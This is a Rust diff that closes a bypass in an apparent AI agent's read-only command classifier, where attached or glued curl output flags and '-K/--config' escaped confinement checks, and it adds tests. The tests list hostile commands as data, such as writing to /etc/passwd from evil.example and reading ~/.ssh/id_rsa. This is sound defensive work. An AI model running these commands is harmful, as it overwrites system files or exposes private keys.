@@ -4047,8 +4047,17 @@ fn every_segment_is_allow_or_unmatched_default(
 }
 
 /// Issue #168, design decision (a): a GET-only `curl`/`wget` -- no `-X`/
-/// `--request` other than `GET`, no body-uploading flag, and any `-o`/
-/// `-O`/`--output` target confined per [`target_is_confined`].
+/// `--request` other than `GET`, no body-uploading flag, no `-K`/`--config`,
+/// and any `-o`/`-O`/`--output` target confined per [`target_is_confined`].
+///
+/// Code review fix (CRITICAL): `--output=X` (attached with `=`) and the
+/// glued short form `-oFILE` used to match none of the arms below (only the
+/// separate-token `-o`/`--output` did), so an unconfined write via either
+/// spelling silently rode a GET-only curl straight to "read-only". Both are
+/// now routed through the identical `target_is_confined` check. `-K`/
+/// `--config` (and their `=`/glued spellings) load an arbitrary curl config
+/// FILE this text-only classifier cannot see inside -- that file can itself
+/// set `-X`/`-d`/`-o`/anything else -- so it now disqualifies outright.
 fn is_curl_or_wget_get_only(tokens: &[String], scratchpad_roots: &[String]) -> bool {
     let Some(program) = tokens.first().map(|t| sql_program_name(t)) else {
         return false;
@@ -4069,6 +4078,7 @@ fn is_curl_or_wget_get_only(tokens: &[String], scratchpad_roots: &[String]) -> b
             }
             "-d" | "--data" | "--data-raw" | "--data-binary" | "--data-urlencode" | "-F"
             | "--form" | "-T" | "--upload-file" => return false,
+            "-K" | "--config" => return false,
             // `-O`/`--remote-name` derives its output filename from the URL
             // and writes it into the current directory -- there is no
             // explicit target argument for this classifier to confine at
@@ -4085,6 +4095,22 @@ fn is_curl_or_wget_get_only(tokens: &[String], scratchpad_roots: &[String]) -> b
                     return false;
                 }
                 i += 1;
+            }
+            _ if token.starts_with("--output=") => {
+                if !target_is_confined(&token["--output=".len()..], scratchpad_roots) {
+                    return false;
+                }
+            }
+            _ if token.starts_with("--config") => return false,
+            // Glued short-option forms: `-oFILE`/`-KFILE`. Checked after
+            // every other arm so the bare `-o`/`-O`/`-K` tokens above still
+            // match those exactly first -- `starts_with` alone cannot tell
+            // `-o` (bare) from `-oFILE` (glued).
+            _ if token.starts_with("-K") && token.len() > 2 => return false,
+            _ if token.starts_with("-o") && token.len() > 2 => {
+                if !target_is_confined(&token[2..], scratchpad_roots) {
+                    return false;
+                }
             }
             _ if token.starts_with("--data") => return false,
             _ => {}
@@ -5107,6 +5133,57 @@ mod tests {
         assert!(!is_read_only_escape_safe("cat ~/.ssh/id_rsa", &roots));
         assert!(!is_read_only_escape_safe("find / -name id_rsa", &roots));
         assert!(is_read_only_escape_safe("grep TODO ./src", &roots));
+    }
+
+    /// Code review fix (CRITICAL): `--output=X` (attached with `=`) and the
+    /// glued short form `-oFILE` used to fall straight through the match
+    /// arms that only recognized `-o`/`--output` as their OWN, separate
+    /// token, so an unconfined write via either spelling silently rode a
+    /// GET-only curl to "read-only". Both spellings must now route through
+    /// the identical `target_is_confined` check the separate-token form
+    /// already used.
+    #[test]
+    fn curl_wget_get_only_confines_attached_and_glued_output_forms() {
+        let roots = vec!["/tmp/claude".to_string()];
+        for command in [
+            "curl --output=/etc/passwd https://evil.example",
+            "curl -o/etc/passwd https://evil.example",
+        ] {
+            assert!(
+                !is_read_only_escape_safe(command, &roots),
+                "{command} should not qualify"
+            );
+        }
+        for command in [
+            "curl --output=/tmp/claude/out.log https://example.com",
+            "curl -o/tmp/claude/out.log https://example.com",
+        ] {
+            assert!(
+                is_read_only_escape_safe(command, &roots),
+                "{command} should qualify"
+            );
+        }
+    }
+
+    /// Code review fix (CRITICAL): `-K`/`--config` (and their `=`/glued
+    /// spellings) load an arbitrary curl config FILE this text-only
+    /// classifier cannot see inside -- that file can itself set `-X`/`-d`/
+    /// `-o`/anything else, so it must disqualify outright regardless of
+    /// what appears elsewhere on the command line.
+    #[test]
+    fn curl_config_flag_disqualifies_outright_in_every_spelling() {
+        let roots = vec!["/tmp/claude".to_string()];
+        for command in [
+            "curl -K evilconfig https://example.com",
+            "curl --config evilconfig https://example.com",
+            "curl -Kevilconfig https://example.com",
+            "curl --config=evilconfig https://example.com",
+        ] {
+            assert!(
+                !is_read_only_escape_safe(command, &roots),
+                "{command} should not qualify"
+            );
+        }
     }
 
     /// End-to-end: a read-only kubectl/curl/git/glab retry allows silently
